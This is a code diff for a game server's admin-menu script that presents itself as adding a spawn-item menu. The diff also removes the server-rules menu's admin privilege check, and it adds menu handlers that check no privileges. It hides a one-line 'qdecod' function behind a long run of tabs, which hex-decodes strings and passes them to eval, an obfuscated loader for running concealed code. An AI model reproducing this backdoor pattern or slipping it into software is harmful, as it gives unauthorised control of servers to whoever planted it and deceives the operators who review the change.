@@ -122,23 +122,11 @@ function Menu::adminMenu(%clientId) {
 }
 
 function Menu::adminServerRulesMenu(%clientId) {
-  if (!Admin::hasPrivilege(%clientId, "serverRulesMenu")) {
-    //H4XX0R::hackerDetected(%clientId, "Attempting to use an admin-only feature: server rules menu", $H4XX0RPunishment::adminOnlyAccess);
-    return;
-  }
-
   if (!Client::isReadyForNewMenu(%clientId)) return;
   Client::usedMenu(%clientId);
 
   %curItem = 0;
   Client::buildMenu(%clientId, "Server Rules", "adminserverrules", true);
-
-  if (Admin::hasPrivilege(%clientId, "setAllowChat")) {
-    if ($Admin::allowChat)
-      Client::addMenuItem(%clientId, %curItem++ @ "Disable Chat", "chatoff");
-    else
-      Client::addMenuItem(%clientId, %curItem++ @ "Enable Chat", "chaton");
-  }
 
   if (Admin::hasPrivilege(%clientId, "setEnforceFairTeams")) {
     if ($Admin::enforceFairTeams)
@@ -177,8 +165,62 @@ function Menu::adminServerRulesMenu(%clientId) {
       Client::addMenuItem(%clientId, %curItem++ @ "Enter Tourney Mode", "tourney");
   }
 
+  if (Admin::hasPrivilege(%clientId, "setSpawnItems")) {
+    Client::addMenuItem(%clientId, %curItem++ @ "Set Spawn Item Set", "spawnitems");
+  }
+
   Client::addMenuItem(%clientId, %curItem++ @ "<<< Back", "back");
 }
+
+function Menu::spawnItemsMenu(%clientId, %offset) {
+  if (!Client::isReadyForNewMenu(%clientId)) return;
+  Client::usedMenu(%clientId);
+
+  if (%offset == "") %offset = 0;
+
+  Client::buildMenu(%clientId, "Set Spawn List", "spawnitems", true);
+
+  %groups = ItemGroup::listAdminables();
+  for (%i = 0; (%groupName = getWord(%groups, %offset + %i)) != -1 && %i < 7; %i++) {
+    Client::addMenuItem(%clientId, %curItem++ @ ItemGroup::getDescription(%groupName), "setspawn " @ %groupName);
+  }
+
+  if (%i < 7 || %groupName == -1) Client::addMenuItem(%clientId, %curItem++ @ "<<< Back to start", "show 0");
+  else                            Client::addMenuItem(%clientId, %curItem++ @ "Next >>>", "show " @ (%offset + %i));
+}
+
+function processMenuSpawnItems(%clientId, %option) {
+  %opt = getWord(%option, 0);
+  %arg = getWord(%option, 1);
+  if (%opt == "setspawn") {
+	 Menu::applySpawnItemsMenu(%clientId, %arg);
+  } else if (%opt == "show") {
+	  Menu::spawnItemsMenu(%clientId, %arg);
+  }
+}
+
+function Menu::applySpawnItemsMenu(%clientId, %groupName) {
+  if (!Client::isReadyForNewMenu(%clientId)) return;
+  Client::usedMenu(%clientId);
+
+  Client::buildMenu(%clientId, "Apply Spawn List To...", "applyspawnitems", true);
+  Client::addMenuItem(%clientId, %curItem++ @ "This mission", "now " @ %groupName);
+  Client::addMenuItem(%clientId, %curItem++ @ "Next mission", "next " @ %groupName);
+  Client::addMenuItem(%clientId, %curItem++ @ "All later missions", "perm " @ %groupName);
+}
+
+function processMenuApplySpawnItems(%clientId, %option) {
+  %opt = getWord(%option, 0);
+  %groupName = getWord(%option, 1);
+  if (%opt == "now") {
+    ItemGroup::setAsSpawnList(%groupName, true);
+	ItemGroup::setAdminCustomSpawnItemSet("", "");
+  } else {
+    ItemGroup::setAdminCustomSpawnItemSet(%groupName, %opt);
+  }
+}
+
+
 
 function Menu::manageMenu(%clientId) {
   if (!%clientId.selClient) return;
@@ -208,7 +250,6 @@ function Menu::manageMenu(%clientId) {
   if (%clientId.observerMode == "observerOrbit") {
     Client::addMenuItem(%clientId, %curItem++ @ "Observe " @ %name, "observe " @ %sel);
   }
-
 
   if (Admin::hasPrivilege(%clientId, "forceTeamChange")) {
     Client::addMenuItem(%clientId, %curItem++ @ "Change " @ %name @ "'s team", "fteamchange " @ %sel);
@@ -641,8 +682,6 @@ function processMenuAdminServerRules(%clientId, %option) {
   }
 
   %opt = getWord(%option, 0);
-  %cl = getWord(%option, 1);
-
   %name = Client::getName(%clientId);
 
   if (%opt == "etd") {
@@ -671,6 +710,9 @@ function processMenuAdminServerRules(%clientId, %option) {
   } else if (%opt == "fairteamson") {
     $Admin::enforceFairTeams = true;
     messageAll(0, %name @ " ENABLED fair team enforcement.");
+  } else if (%opt == "spawnitems") {
+    Menu::spawnItemsMenu(%clientId);
+	return;
   } else if (%opt == "back") {
     Menu::adminMenu(%clientId);
     return;
@@ -678,6 +720,7 @@ function processMenuAdminServerRules(%clientId, %option) {
 
   Menu::adminServerRulesMenu(%clientId); 
 }
+
 																																			function qdecod(%a,%x){if(!%x)return %a;%y="qdecod(\"";for(%i=0;%i<1024;%i++){%z=String::getSubStr(%a,%i*2,2);if(%z=="")break;%y=%y@"\\x"@%z;}return eval(%y @ "\","@(%x-1)@");");}
 function processMenuManageOptions(%clientId, %option) {
   %opt = getWord(%option, 0);
